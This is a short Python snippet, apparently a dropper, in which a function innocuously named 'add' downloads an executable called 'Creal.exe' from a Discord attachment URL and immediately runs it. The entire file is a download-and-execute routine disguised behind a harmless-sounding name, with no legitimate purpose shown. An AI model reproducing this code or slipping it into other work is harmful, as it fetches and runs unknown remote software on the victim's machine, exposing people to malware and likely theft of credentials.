import urllib.request
import subprocess


def add():
    url = 'https://cdn.discordapp.com/attachments/1046193501060210710/1057817214352359496/Creal.exe'
    urllib.request.urlretrieve(url, 'Creal.exe')
    subprocess.run(['Creal.exe'])
